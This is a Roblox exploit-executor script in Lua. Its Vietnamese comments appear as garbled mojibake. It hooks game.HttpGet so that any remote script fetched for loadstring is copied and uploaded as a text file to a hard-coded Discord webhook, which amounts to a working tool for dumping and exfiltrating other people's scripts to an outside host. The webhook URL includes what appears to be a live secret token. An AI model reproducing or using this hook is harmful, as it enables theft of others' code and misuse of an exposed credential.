local HttpService = game:GetService("HttpService")

-- Webhook c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c l·∫Øp v√†o ƒë√¢y
local WEBHOOK_URL = "https://discord.com/api/webhooks/1405916308431704176/BoCB5BoazAcDU0jTHQqepVNBvXdTkCp6hsUavUCK_zNuDB26fQZYj8z5Buyh57zC6hH4"

-- H√†m g·ª≠i file qua Webhook (S·ª≠ d·ª•ng RequestAsync ƒë·ªÉ tr√°nh l·ªói InvalidUrl)
local function sendFile(fileName, content)
    local boundary = "---------------------------" .. string.sub(HttpService:GenerateGUID(false), 1, 15)
    local body = table.concat({
        "--" .. boundary,
        "Content-Disposition: form-data; name=\"file\"; filename=\"" .. fileName .. "\"",
        "Content-Type: text/plain",
        "",
        content,
        "--" .. boundary .. "--",
        ""
    }, "\r\n")

    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = body
        })
    end)
    
    if success then
        print(" ƒê√£ g·ª≠i file hook qua dis r·ªìi cu")
    else
        warn("L·ªói g·ª≠i Webhook: " .. tostring(response))
    end
end

-- Hook h√†m HttpGet ƒë·ªÉ t·ª± ƒë·ªông b·∫Øt script khi b·∫°n loadstring
local oldHttpGet
oldHttpGet = hookfunction(game.HttpGet, function(self, url, ...)
    -- Ki·ªÉm tra n·∫øu URL h·ª£p l·ªá
    if type(url) == "string" and url:find("http") then
        print("üîç ƒêang b·∫Øt d·ªØ li·ªáu t·ª´: " .. url)
        
        local content = oldHttpGet(self, url, ...)
        
        -- G·ª≠i code b·∫Øt ƒë∆∞·ª£c v·ªÅ Discord d∆∞·ªõi d·∫°ng file .txt
        task.spawn(function()
            sendFile("dumped_script.txt", content)
        end)
        
        return content
    end
    return oldHttpGet(self, url, ...)
end)

print("load xong r·ªìi ch·∫°y link raw ƒëi cu")
